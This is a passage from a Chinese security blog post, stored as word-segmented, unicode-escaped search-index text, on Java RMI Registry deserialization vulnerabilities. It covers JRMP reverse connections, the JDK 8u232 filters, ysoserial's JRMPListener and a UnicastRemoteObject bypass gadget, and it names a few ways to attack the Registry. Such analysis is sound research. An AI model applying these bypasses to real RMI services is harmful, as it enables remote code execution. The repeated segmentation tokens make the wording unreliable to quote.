\u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u6211\u4eec \u5728 3 \u7684 \u90e8\u5206 \u627e \u7684 \u90a3 \u51e0\u4e2a \u7c7b \u90fd \u56e0\u4e3a \u662f\u56e0\u4e3a \u5c01\u88c5 UnicastRef \uff0c \u5728 \u5b9e\u9645 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u8fc7\u7a0b \u4e2d \uff0c \u8fd9 \u51e0\u4e2a \u7c7b \u7684 \u5c5e\u6027 \u88ab \u8c03\u7528 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u800c \u8fd8\u539f UnicastRef \u3002   \u5728 \u5e38\u89c1 \u7684 readObject \u51fd\u6570 \u7684 \u5904\u7406 \u4e2d \uff0c \u5176\u5b9e \u6709 \u4e00\u70b9 \u5f88 \u91cd\u8981 \uff0c \u4ed6 \u662f \u4e00\u4e2a \u9012\u5f52 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u8fc7\u7a0b \uff0c \u5c31\u7b97 \u5f53\u524d \u7c7b \u4e0d \u5b58\u5728 \uff0c \u4f46\u662f \u8fd8\u662f \u4f1a \u53bb \u9012\u5f52 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5f53\u524d \u6570\u636e \u4e2d \u7684 \u7c7b \u5c5e\u6027 \u3002   \u6240\u4ee5 \u6211\u4eec \u4e5f \u53ef\u4ee5 \u4e0d\u7528 \u524d\u9762 \u627e\u5230 \u7684 \u51e0\u4e2a \u7c7b \uff0c \u81ea\u5df1 \u5199 \u4e00\u4e2a \u5c01\u88c5 UnicastRef \u4e5f \u80fd \u540c\u6837 \u8fbe\u5230 \u8fd9\u79cd \u6548\u679c \uff0c \u5177\u4f53 \u770b   RMIConnectWrapped   0x04   \u540e\u7eed   jdk > = 8u232 _ b09   jdk \u7248\u672c 8u232 _ b09 \u4fee\u590d \u4e86 \u524d\u9762 \u4f7f\u7528 \u53cd\u5411 \u53d1\u8d77 JRMP \u8fde\u63a5 \u7684 \u5229\u7528 \u3002 \u4fee\u590d \u70b9 \u5305\u62ec \u4e24\u4e2a   \u4e00 \uff1a RegistryImpl _ Skel   sun . rmi . registry . RegistryImpl _ Skel # dispatcher   \uff0c \u8fd9\u91cc \u622a \u4e86 lookup \u51fd\u6570 \u7684 \u5904\u7406 \uff0c bind / rebind \u51fd\u6570 \u7684 \u5904\u7406 \u662f \u4e00\u6837 \u7684   \u5f53 \u53d1\u751f \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u9519\u8bef \u6216\u8005 \u7c7b\u578b \u8f6c\u6362 \u7c7b\u578b\u8f6c\u6362 \u9519\u8bef \u65f6 \uff0c \u4f1a \u8c03\u7528   call . discardPendingRefs   \uff0c \u5c06 \u73b0\u6709 \u7684 JRMP \u8fde\u63a5 \u6e05\u9664 \u6389 \u3002 \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u8fd9\u91cc \u6211\u4eec \u65e0\u6cd5 \u7528 JRMP \u53cd\u5411 \u94fe\u63a5 \u7684 \u65b9\u5f0f \u6765 \u8fbe\u6210 \u5229\u7528 \u4e86 \u3002   \u4e8c \uff1a DGCImpl _ Stub   \u5f53 Registry \u5904\u7406 JRMP \u53cd\u8fde \u7684 \u65f6\u5019 \uff0c \u4f1a \u8c03\u7528   DGCImpl _ Stub # dirty   \uff0c \u800c   ref . invoke   \u4f1a \u6700\u7ec8 \u8c03\u7528   sun . rmi . transport . StreamRemoteCall # executeCall   \u6765 \u5904\u7406 \u8fd4\u56de \u7684 \u5f02\u5e38 \uff0c \u8fd9\u91cc \u4f1a \u6700\u7ec8 \u5bfc\u81f4 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 ( \u8be6\u7ec6 \u89c1 0x05 \u756a\u5916 )   \u800c \u5728 232 \u7248\u672c \uff0c \u5c06 \u539f\u672c \u5728 \u540e\u9762 \u6ce8\u518c \u7684   leaseFilter   \u63d0\u5230 \u4e86 \u524d\u9762   \u770b\u770b \u8be5 \u8fc7\u6ee4 \u6ee4\u5668 \u8fc7\u6ee4\u5668 \u7684 \u9650\u5236   sun / rmi / transport / DGCImpl _ Stub . java # leaseFilter   \u5bf9\u4e8e \u8fd4\u56de \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u5bf9\u8c61 \uff0c \u53ea \u5141\u8bb8 \u4e0a\u9762 \u7684 \u51e0\u79cd \u7c7b\u578b \uff0c \u800c \u73b0\u6709 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe\u4e2d HashSet \u3001 HashTable \u7b49 \u7c7b \u90fd \u662f \u4e0d\u8fc7 \u901a\u4e0d\u8fc7 \u7684 \u3002   \u6240\u4ee5 \u5728 Registry \u53d1\u8d77 \u7684 \u53cd\u5411 \u8fde\u63a5 \u662f \u65e0\u6cd5 \u5229\u7528 \u6210\u529f \u7684 \u3002   ps : \u8fd9\u91cc \u7528 \u7684   DGCImpl _ Stub   \u662f \u5ba2\u6237 \u5ba2\u6237\u7aef \u53d1\u8d77 \u65f6 \u4f7f\u7528 \u7684 \uff0c \u76f8\u5bf9 \u5e94 \u7684 \u8fd8\u6709 server \u7aef \u63a5\u6536 Client \u53d1\u8d77 \u7684 \u8fde\u63a5 \u7684 \u5904\u7406   DGCImpl _ Skel   \uff0c skel \u8fd9\u91cc \u4e5f \u5b58\u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \uff0c \u5177\u4f53 \u89c1 0x08   0x05   \u756a\u5916 \uff1a ysoserial \u4e2d \u7684 JRMPListener \u4e0e JRMPClient   \u770b \u4e86 \u4e0a\u9762 \u53ef\u80fd \u4f60 \u4f1a \u7591\u60d1 \uff0c \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 server \u7aef \u53d1\u8d77 \u4e00\u4e2a RMI \u7684 \u8fde\u63a5 \u5c31 \u4f1a \u89e6\u53d1 java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff1f   \u524d \u6587 \u6211\u4eec \u5c06 \u7684 \u662f RMI   Registry \u5728 \u63a5\u6536 \u8fdc\u7a0b \u7ed1\u5b9a \u5bf9\u8c61 \u65f6\u6240 \u53d1\u751f \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \uff0c \u90a3\u4e48 RMI   Client \u5728 \u63a5\u6536 Server \u7aef\u7684 \u6570\u636e \u65f6 \u662f\u5426 \u4e5f \u4f1a \u53d1\u751f \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u5462 \uff1f \u7b54\u6848 \u662f \u80af\u5b9a \u7684 \uff0c \u6bd5\u7adf RMI \u4ea4\u4e92 \u8fc7\u7a0b \u4e2d \u7684 \u6570\u636e \u91c7\u7528 \u7684 \u662f \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u6570\u636e \uff0c \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u5b58\u5728 \u7740 \u4e00\u4e2a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u8fc7\u7a0b \u3002   \u770b \u4e00\u4e0b JRMPListener \u7684 \u4ee3\u7801 \uff0c \u7b80\u5355 \u6765\u8bf4 \uff0c \u5176 \u5b9e\u73b0 \u4e86 \u4e0e RMI   Client \u7684 \u4ea4\u4e92 \u6d41\u7a0b \u3002 \u8fd9\u91cc \u6211\u4eec \u76f4\u63a5 \u770b \u91cd\u70b9 \u7684 \u4ee3\u7801   \u5728 \u5b8c\u6210 \u524d\u9762 \u7684 \u4e00\u4e9b \u4ea4\u4e92 \u6b65\u9aa4 \u540e \uff0c Listener \u4f1a \u5411 Client \u53d1\u9001 \u4e00\u4e2a ExceptionalReturn \u7684 \u72b6\u6001 \uff0c \u5e76 \u5c06 \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 payload \u586b\u5145 \u5230 BadAttributeValueExpException \u7684 val \u5c5e\u6027 \u3002 \u8fd9\u91cc \u7528 \u7684 BadAttributeValueExpException \u5e76 \u4e0d\u662f \u6211\u4eec \u4ee5\u524d \u5206\u6790 \u65f6 \u505a \u7684 toString \u89e6\u53d1 \u70b9 \uff0c \u800c\u662f \u4ec5 \u4f5c\u4e3a payload \u7684 \u4e00\u4e2a \u8f7d\u4f53 \uff0c \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 BadAttributeValueExpException \u7684 val \u5c5e\u6027 \u65f6 \u540c\u6837 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u4e86 \u6211\u4eec \u7684 payload \u3002   \u800c \u4f4d\u4e8e Client \u5728 \u63a5\u6536 \u5230 ExceptionalReturn \u65f6 \u7684 \u5904\u7406 \u65b9\u5f0f \u89c1   sun / rmi / transport / StreamRemoteCall . java # executeCall   \u524d\u9762 \u7684 \u5206\u6790 \u90fd \u7701\u7565 \u4e86   \u5728 \u8fd9\u91cc \u6211\u4eec \u770b\u5230 \u4e86 \u719f\u6089 \u7684 readObject \u51fd\u6570 \uff0c \u5176 \u7528\u4e8e \u5c06 \u524d\u9762 \u7684 Exception \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002   \u5230 \u8fd9\u91cc \u5c31 \u53ef\u4ee5 \u4e32 \u8d77\u6765 \u4e86 \uff0c Client \u53d1\u8d77 RMI \u8fde\u63a5 \uff0c \u8fde\u63a5 \u5230 \u6211\u4eec \u7684 \u6076\u610f Listener \u4e0a\u9762 \u3002 \u800c \u6211\u4eec \u7684 Listener \u5c06 \u8fd4\u56de \u4e00\u4e2a \u6784\u9020 \u597d \u7684 Exception \uff0c \u65e8\u5728 Client \u63a5\u6536 \u5230 ExceptionalReturn \u7684 \u4fe1\u53f7 \u65f6 \u8fdb\u884c \u8fd8\u539f \uff0c \u4ece\u800c \u9020\u6210 \u4e86 RMI   Client \u7aef \u4e5f \u53d7\u5230 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u653b\u51fb \u3002   0x06   \u603b\u7ed3   \u524d \u6587 \u4e3b\u8981 \u8bb2\u8bc9 \u4e86 RMI \u7684 \u76f8\u5173 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u95ee\u9898 \uff0c \u5305\u62ec RMI   Registry \u548c RMI   Client \u63a5\u6536 \u5230 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u65f6 \u4ea7\u751f \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u3002   \u5168\u6587 \u6240 \u4f7f\u7528 \u7684 JDK \u7248\u672c \u4e3a JDK8 \uff0c \u5728 \u5206\u6790 \u8fc7\u7a0b \u4e2d \uff0c \u53d1\u73b0 \u5728 \u6700\u8fd1 \u7684 JDK8u \u7248\u672c \u4e0a \uff0c \u5df2 \u65e0\u6cd5 \u5bf9 RMI   Registry \u53d1\u8d77 \u653b\u51fb \uff0c \u4f46 \u5176 \u5728 JDK8u232 _ b09 \u4e4b\u524d \u7684 \u7248\u672c \u8fd8\u662f \u53ef\u4ee5 \u7684 \u3002   \u672c\u6587 \u4e3b\u8981 \u653b\u51fb \u7684 \u662f RMI   Registry \uff0c \u800c RMI \u7684 \u653b\u51fb \u653b\u51fb\u9762 \u4e0d \u5355\u5355 \u6587\u4e2d \u63d0\u5230 \u7684 \u8fd9\u79cd \u65b9\u5f0f \uff0c \u8fd8 \u5b58\u5728   \u9488\u5bf9 codebase \u7684 \u653b\u51fb \u89c1 https : / / github . com / vulhub / vulhub / blob / master / java / rmi - codebase / README . md \uff0c \u52a0\u8f7d \u6211\u4eec \u6784\u9020 \u597d \u7684 class \u3002 \u5f53\u7136 \u73b0\u5728 \u8fd9\u79cd \u60c5\u51b5 \u6bd4\u8f83 \u5c11 \u4e86 \u3002   \u9488\u5bf9 \u7ed1\u5b9a \u7684 \u5371\u9669 obj \u7684 \u653b\u51fb \uff0c \u6211\u4eec \u53ef\u4ee5 \u901a\u8fc7 list \u6240\u6709 \u7ed1\u5b9a \u7684 obj \uff0c \u67e5\u627e \u5371\u9669 \u7684 \u7ed1\u5b9a \u5730\u5740 \u8fdb\u884c \u653b\u51fb \u3002 \u8fd9\u91cc \u7684 \u5371\u9669 \u600e\u4e48 \u5b9a\u4e49 \u5462 \uff1f \u7b2c\u4e00 \u662f \u7ed1\u5b9a \u7684 \u5bf9\u8c61 \u786e\u5b9e \u5b58\u5728 \u64cd\u4f5c \u7cfb\u7edf \u64cd\u4f5c\u7cfb\u7edf \u547d\u4ee4 \u7b49 \uff1b \u7b2c\u4e8c \u662f \u8be5 \u5bf9\u8c61 \u7684 \u7c7b \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u4e2d \u5b58\u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u70b9 \uff0c \u6bd4\u5982 hello ( HashTable   xxx ) \uff0c \u5176\u4e2d \u7684 HashTable \u662f CommonsCollections7 \u7684 \u89e6\u53d1 \u70b9 \uff0c \u5728 \u4f20\u9012 \u8fc7\u7a0b \u4e2d \uff0c xxx \u4f1a \u88ab \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u5230 \u4e86 RMI   Server \u65f6\u4f1a \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u4e5f \u5c31 \u6267\u884c \u4e86 \u6211\u4eec \u7684 payload \u3002 \u6700\u540e \uff0c \u8fd9\u91cc \u6682\u65f6 \u8fd8 \u6ca1 \u627e\u5230 \u6848\u4f8b ...   0x07   20200303 \u66f4\u65b0   UnicastRemoteObject   Gadget   \u8fd9\u4e2a Gadget \u7684 \u6765\u6e90 \u662f https : / / mogwailabs . de / blog / 2020 / 02 / an - trinhs - rmi - registry - bypass /   \u7ecf\u8fc7 \u6d4b\u8bd5 \uff0c \u8fd9\u4e2a Gadget \u53ef\u4ee5 \u505a\u5230 \u8ddf JRMPClient \u4e00\u6837 \u7684 \u6548\u679c \uff0c \u4f46\u662f \u65e0\u6cd5 \u8ddf \u4e0a\u9762 \u7684 Level2 \u4e00\u6837 \u7ed5\u8fc7 \u9650\u5236 \uff0c \u539f\u56e0 \u770b \u4e0b\u9762   \u672c\u5730 \u5728 bind \u6216 rebind \u4e00\u4e2a Remote \u5bf9\u8c61 \u65f6 \uff0c \u4f1a \u5728 sun / rmi / server / MarshalOutputStream . java # replaceObject \u8fdb\u884c \u8f6c\u5316   \u539f\u6765 \u7684 \u5bf9\u8c61 \u4f1a \u88ab \u8f6c\u5316 \u5316\u6210 \u8f6c\u5316\u6210 \u4e0a\u9762 \u7684 \u4e00\u4e2a \u7ed3\u6784 \uff0c \u8fd9\u91cc \u76f4\u63a5 \u4e22\u6389 \u4e86 UnicastRemoteObject \uff0c \u81ea\u7136 \u5728 Registry \u7aef \u65e0\u6cd5 \u4ece UnicastRemoteObject \u7684 readObject \u51fd\u6570 \u5f00\u59cb \uff0c \u8fd9\u6837 \u8fd9\u4e2a Gadget \u5c31 \u65e0\u6cd5 \u6210\u529f \u5229\u7528 \u4e86 \u3002   \u8981 \u60f3 \u5229\u7528 \u8fd9\u4e2a \u94fe\u6765 \u7ed5\u8fc7 \u9650\u5236 \uff0c \u6211\u4eec \u53ef\u80fd \u5f97 \u81ea\u5df1 \u5199 \u4e00\u4e2a bind \u7684 \u8fc7\u7a0b \u624d \u53ef\u4ee5 \uff0c \u628a getTarget \u7684 \u8fc7\u7a0b \u53bb\u6389 \u76f4\u63a5 \u53d1 \u8fc7\u53bb \u3002 \u8fd9\u4e2a Gadget \u5229\u7528 \u4ef7\u503c \u6bd4\u8f83 \u4f4e XD   ps \uff1a \u8c8c\u4f3c \u53ef\u4ee5 \u901a\u8fc7 \u91cd\u5199 \u7684 \u65b9\u5f0f \u6765 \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898 \uff0c \u8fd9\u91cc \u6709\u7a7a \u518d \u5206\u6790 XD   20200617   \u66f4\u65b0 UnicastRemoteObject   Gadget   \u524d\u9762 \u5728 \u505a \u5206\u6790 \u65f6 \uff0c \u53d1\u73b0 \u5728 \u4f7f\u7528 \u8fd9\u4e2a \u5229\u7528 \u94fe \u7684 \u65f6\u5019 \uff0c \u5728 \u53d1 \u8fc7\u53bb \u4e4b\u524d \u5c31 \u4f1a \u88ab \u66ff\u6362 UnicastRef \u7684 \u95ee\u9898 \uff0c \u5bfc\u81f4 \u6211\u4eec \u53d1\u5230 Registry \u540e \u65e0\u6cd5 \u8fd8\u539f \u51fa \u6b63\u786e \u7684 jrmp \uff0c \u4eca\u5929 \u6765 \u770b\u770b \u4ed6 \u662f \u600e\u4e48 \u66ff\u6362 \u7684   java . io . ObjectOutputStream # writeObject0 # 1143   if   (   enableReplace   )   {   Object   rep   =   replaceObject   (   obj   ) ;   if   (   rep   ! =   obj   &&   rep   ! =   null   )   {   cl   =   rep   .   getClass   ( ) ;   desc   =   ObjectStreamClass   .   lookup   (   cl   ,   true   ) ;   }   obj   =   rep   ;   }   \u4ece   call . getOutputStream ( )   \u83b7\u53d6 \u5230 \u7684 outputstream \u5728 \u5199\u5165 \u5177\u4f53 \u7684 object \u65f6 \uff0c \u540e\u7eed \u4f1a \u6267\u884c \u5230 \u524d\u9762 \u7684 \u4ee3\u7801 \u4e0a \uff0c \u5224\u65ad \u662f\u5426 \u9700\u8981 enableReplace \uff08 \u9ed8\u8ba4 \u662f true \uff09 \uff0c \u6240\u4ee5 \u4f1a \u9ed8\u8ba4 \u8d70\u5230 \u6211 \u5728 3 \u6708\u4efd \u65f6 \u5206\u6790 \u7684 \u5730\u65b9 \uff0c \u628a \u6211\u4eec \u60f3\u8981 \u7684 jrmp \u8fde\u63a5 \u7ed9 \u66ff\u6362 \u6389 \u4e86 \u3002   \u6240\u4ee5 \u89e3\u51b3 \u8fd9\u4e2a \u95ee\u9898 \u7684 \u65b9\u6848 \u5c31\u662f \u5c06 \u8fd9\u4e2a enableReplace \u7ed9 \u7f6e \u4e3a false \uff0c \u8fd9\u91cc \u5b9e\u73b0 \u8d77\u6765 \u5c31 \u6bd4\u8f83 \u7b80\u5355 \u6bd4\u8f83\u7b80\u5355 \u4e86 \uff0c \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u5bf9 outputstream \u505a \u53cd\u5c04 \u8c03\u7528 \uff0c \u66ff\u6362 true \u4e3a false \uff0c \u5177\u4f53 \u5b9e\u73b0 \u89c1   L34   \u8fd9\u91cc \u9700\u8981 \u63d0 \u4e00\u70b9 \u7684 \u662f \u8fd9 \u6761\u94fe \u5de7\u5999 \u4e4b \u5904 \u5728\u4e8e   UnicastRemoteObject \u5229\u7528 \u94fe \u7528\u5230 \u7684 \u5bf9\u8c61 \u90fd \u662f \u5728 Registry \u53ef\u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u540d\u5355 \u767d\u540d\u5355 \u91cc \u7684   \u8ddf \u524d\u9762 \u51e0\u4e2a \u5c01\u88c5 unicastref \u7684 \u601d\u8def \u4e0d\u540c \uff0c UnicastRemoteObject \u5b9e\u9645 \u5b9e\u9645\u4e0a \u662f \u4e3b\u52a8 \u5411\u5916 \u53d1\u51fa jrmp \u8fde\u63a5 \u7684 \u65b9\u5f0f \uff0c \u800c \u4e0d\u662f \u524d\u9762 \u901a\u8fc7 incomingtable \u8868 \u7684 \u65b9\u5f0f \u53bb \u89e6\u53d1 jrmp \u8fde\u63a5   \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 \u8bf4 \u4ed6 \u5de7\u5999 \u5462 \uff1f \u5728 > = 8u232 _ b09 \u7248\u672c \u5b58\u5728 \u4e24\u4e2a \u9650\u5236 \uff08 \u5177\u4f53 \u89c1 0x04 \uff09   \u6d88\u9664 \u4e86 \u5c01\u88c5 unicastRef \u7684 \u5a01\u80c1   \u5728 DGC \u5c42 \u6dfb\u52a0 \u4e86 \u540d\u5355 \u767d\u540d\u5355 \u7684 \u65b9\u5f0f \uff0c \u5bfc\u81f4 \u5c31\u7b97 jrmp \u80fd \u53cd\u94fe \u4e5f \u4e0d\u80fd \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u51fa \u540d\u5355 \u767d\u540d\u5355 \u4e4b\u5916 \u7684 \u7c7b   \u800c UnicastRemoteObject \u7ed5\u8fc7 \u4e86 \u4e0a\u9762 \u7684 \u4e24\u4e2a \u9650\u5236   \u9996\u5148 \u5bf9\u4e8e \u7b2c\u4e00 \u4e00\u4e2a \u7b2c\u4e00\u4e2a \u9650\u5236 \uff0c UnicastRemoteObject \u7684 jrmp \u53cd\u8fde \u53d1\u751f \u5728 readObject \u8fc7\u7a0b \u4e2d   \u5176\u6b21 \u5bf9\u4e8e \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u9650\u5236 \uff0c \u524d\u9762 \u63d0\u5230 Registry \u80fd \u89e6\u53d1 JRMP \u53cd\u8fde \u4e3b\u8981 \u56e0\u4e3a \u662f\u56e0\u4e3a \u8c03\u7528 \u4e86   DGCClient . registerRefs   \u53bb \u5904\u7406   \u800c \u8fc7 \u8fd9\u4e2a \u70b9 \u5c31 \u9700\u8981 \u53d7\u5230 \u524d\u9762 \u63d0\u5230 \u7684 DGC \u540d\u5355 \u767d\u540d\u5355 \u7684 \u95ee\u9898 \u3002 \u600e\u4e48 \u7ed5\u8fc7 \u8fd9\u4e2a \u5730\u65b9 \uff1f \u7b80\u5355 \u7684 \u5c31\u662f \u627e \u4e00\u4e2a \u4e0d \u7ecf\u8fc7 DGCClient \u6765 \u89e6\u53d1 \u5373\u53ef \u3002   \u524d\u9762 \u5206\u6790 < 8u232 _ b09 \u65f6 \uff0c \u7528\u5230 \u7684 RemoteObjectInvocationHandler \u7684 \u65b9\u5f0f \u6765 \u89e6\u53d1 \uff0c \u4e0d\u8fc7 \u8fd9\u91cc \u5176\u5b9e \u53ea\u7528 \u5230 \u4e86 \u5c01\u88c5 UnicastRef \u7684 \u4f5c\u7528 \uff08 \u8fd9\u91cc \u63d0 \u4e00\u4e0b \u5b9e\u9645 \u89e6\u53d1 \u65f6 \u9700\u8981 \u8c03\u7528 UnicastRef . invoke \uff09 \u3002 UnicastRemoteObject \u5bf9 \u8fd9\u4e2a handler \u505a \u4e86 \u66f4 \u6df1\u5165 \u7684 \u5229\u7528 \uff0c \u8fd9\u91cc \u7528\u5230 \u4e86   java . rmi . server . RemoteObjectInvocationHandler # invokeRemoteMethod   \u8c03\u7528 \u4e86   ref . invoke   \u89e6\u53d1 jrmp \u53cd\u8fde \uff0c \u5230 \u8fd9\u91cc \u90fd \u6ca1\u6709 \u7ecf\u8fc7 DGCClient \u7684 \u8def\u5f84 \uff0c \u81ea\u7136 \u4e5f \u5c31 \u6ca1\u6709 \u540d\u5355 \u767d\u540d\u5355 \u7684 \u9650\u5236 \u3002   \u4e0d\u8fc7 \u8fd9\u6761 \u94fe \u5230 \u4e86 8u242 \u4e5f \u5931\u6548 \u4e86 \uff0c \u4e3b\u8981 \u539f\u56e0 \u5728\u4e8e lookup \u63a5\u53e3 \u65e0\u6cd5 \u518d \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u975e string \u7c7b\u578b \u7684 object \u4e86   0x08   RMI   DGC \u5b9e\u73b0 \u95ee\u9898 ( ysoserial . expliots . JRMPClient )   \u5728 JEP290 \u4e4b\u524d \uff0c RMI \u7684 DGCImpl _ skel # dipatch \u63a5\u6536 \u5904 \uff0c \u83b7\u53d6 \u5230 \u6570\u636e \u540e \uff0c \u76f4\u63a5 readObject \u9020\u6210 \u7684 \u3002   \u5728 JEP290 \u4e4b\u540e \uff0c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u524d \u505a \u4e86 \u6821\u9a8c \uff0c \u89c1 DGCImpl   \u5bfc\u81f4 \u4e86 ysoserial \u7684 exploit \u4e2d \u7684 JRMPClient \u5931\u6548   0x09   \u603b\u7ed3 \u4e2d \u7b2c\u4e8c \u4e8c\u79cd \u7b2c\u4e8c\u79cd \u65b9\u5f0f \u7684 \u89e6\u53d1 \u70b9 \uff08 20200317   \u66f4\u65b0 \uff09   \u524d\u9762 \u603b\u7ed3 \u4e2d \u63d0\u5230 \u7684 \u7b2c\u4e8c \u4e2d \u65b9\u5f0f \uff1a \u901a\u8fc7 \u5bfb\u627e \u53ef\u4ee5 \u5229\u7528 \u7684 \u7ed1\u5b9a \u5bf9\u8c61 \u7684 \u51fd\u6570 \u7684 \u53c2\u6570 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528   \u76f4\u63a5 \u8bb2 \u89e6\u53d1 \u70b9   sun / rmi / server / UnicastServerRef . java # dispatch # 338   \u5f53 \u6211\u4eec \u7f16\u5199 Client \u7aef \u5bf9 Server \u7aef \u6302\u8f7d \u7684 \u5bf9\u8c61 \u8fdb\u884c \u8fdc\u7a0b \u51fd\u6570 \u8c03\u7528 \u51fd\u6570\u8c03\u7528 \uff08 RMI \uff09 \u65f6 \uff0c Server \u7aef\u4f1a \u9010\u4e00 \u8fdb\u884c \uff08 \u83b7\u53d6 \u5230 Methtod \uff0c \u89e3\u6790 parameters \uff0c \u6700\u540e \u8fdb\u884c invoke \u8c03\u7528 \uff09 \u3002 \u800c \u5728 \u89e3\u6790 params \u65f6 \uff08 \u6211\u4eec \u8bb2\u8fc7 RMI \u8fc7\u7a0b \u4e2d \uff0c \u5bf9\u8c61 \u5747 \u662f \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u72b6\u6001 \uff09 \u6211\u4eec \u9700\u8981 \u5148\u5bf9 \u53c2\u6570 \u5bf9\u8c61 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u4e5f \u5c31\u662f \u7b2c 338 \u884c\u6240 \u505a \u7684 \u5de5\u4f5c \uff0c \u7ee7\u7eed \u5f80\u4e0b \u8ddf   \u5728 \u51fd\u6570   unmarshalParametersUnchecked   \u4e2d \u5206\u522b \u5bf9 \u6bcf\u4e2a \u53c2\u6570 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fd8\u539f   \u5982\u679c \u6240 \u63a5\u53d7 \u7684 \u7c7b\u578b \u975e \u57fa\u7840 \u6570\u636e \u7ed3\u6784 \u6570\u636e\u7ed3\u6784 \uff0c \u90a3\u4e48 \u5c06 \u76f4\u63a5 \u8c03\u7528 readObject \uff0c \u8fd9\u90e8 \u90e8\u5206 \u8fd9\u90e8\u5206 \u5e76 \u6ca1\u6709 \u524d\u9762 filter \u7684 \u9650\u5236   \u6240\u4ee5 \u5982\u679c \u627e\u5230 \u4e86 \u4e00\u4e2a Server \u7aef \u6302\u8f7d \u7684 \u5bf9\u8c61 \u5b58\u5728 \u51fd\u6570 \u53c2\u6570 \u51fd\u6570\u53c2\u6570 \u7c7b\u578b \u4e3a Object \u3001 HashTable \u7b49 \u7c7b\u578b \u65f6 \uff0c \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 \u7a7f \u5165 \u6784\u9020 \u597d \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u3002 \u5f53\u524d \u524d\u63d0 \u8fd8\u662f Server \u7aef\u7684 \u73af\u5883 \u4e2d \u5b58\u5728 \u76f8\u5e94 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe \u7684 \u4f9d\u8d56 \u3002","title":"\u6d45\u8c08 Java   RMI   Registry \u5b89\u5168 \u95ee\u9898"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x00","text":"\u672c\u6587 \u8bb2\u8ff0 \u4e86 Java   RMI   Registry \u76f8\u5173 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u95ee\u9898 \uff0c \u4e3b\u8bb2 Registry \uff0c \u540e\u7eed \u8865\u5145 \u4e86 Client \u7aef \u548c Server \u7aef\u7684 \u5229\u7528","title":"0x00   \u524d\u8a00"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x01","text":"Java   RMI \u6d41\u7a0b \u53ef \u53c2\u8003   1   \uff0c \u51fa \u95ee\u9898 \u7684 \u4f4d\u7f6e \u5728\u4e8e \uff1a","title":"0x01   \u539f\u7406"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#registry-bindrebind","text":"\u4ece Client \u63a5\u6536 \u5230 \u7684 bind \u6216 rebind \u7684   remote   obj   \uff0c \u5c06 \u7531   sun / rmi / registry / RegistryImpl _ Skel . java # dispatch   \u5904\u7406   \uff08 \u4e0b\u56fe \u4e3a JDK8u141 \u4e4b\u524d \u7684 \u7248\u672c \u7684 \u5b9e\u73b0 \uff09   \u53ef\u4ee5 \u770b\u5230 \u83b7\u53d6 \u5230 \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u6570\u636e \u76f4\u63a5 \u8c03\u7528 \u4e86 readObject \u51fd\u6570 \uff0c \u5bfc\u81f4 \u4e86 \u5e38\u89c4 \u7684 Java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \u7684 \u89e6\u53d1 \u3002   \u8fd9\u91cc \u6211\u4eec \u53ea \u9700\u8981 \u5199 \u4e00\u4e2a bind \u6216 rebind \u7684 \u64cd\u4f5c \uff0c \u5373\u53ef \u653b\u51fb \u5230 RMI   Registry \u3002","title":"\u60c5\u666f \u4e00 \uff1a Registry   \u63a5\u6536 bind / rebind 